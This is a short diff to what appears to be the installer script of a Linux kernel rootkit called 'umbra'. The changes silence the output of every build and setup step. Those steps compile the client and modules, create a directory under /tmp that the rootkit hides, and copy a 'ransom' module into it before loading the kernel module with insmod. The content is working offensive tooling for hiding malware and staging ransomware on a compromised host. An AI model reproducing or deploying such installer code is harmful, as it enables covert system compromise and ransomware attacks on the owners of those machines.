@@ -6,15 +6,15 @@ fi
 
 # You need to have compiled umbra.ko by now, either on the target or a machine with the same header files
 # Installing module
-cd client
-make
-cd ../modules
-make
-cd ..
-mkdir /tmp/umbra #secret dir for umbra, hidden by the rootkit
-cp modules/ransom /tmp/umbra
+cd client &> /dev/zero
+make &> /dev/zero
+cd ../modules &> /dev/zero
+make &> /dev/zero
+cd .. &> /dev/zero
+mkdir /tmp/umbra &> /dev/zero #secret dir for umbra, hidden by the rootkit
+cp modules/ransom /tmp/umbra &> /dev/zero
 
-cd kernel
+cd kernel &> /dev/zero
 insmod ./umbra.ko
 
 if [[ $(lsmod | grep umbra) = *umbra* ]]; then
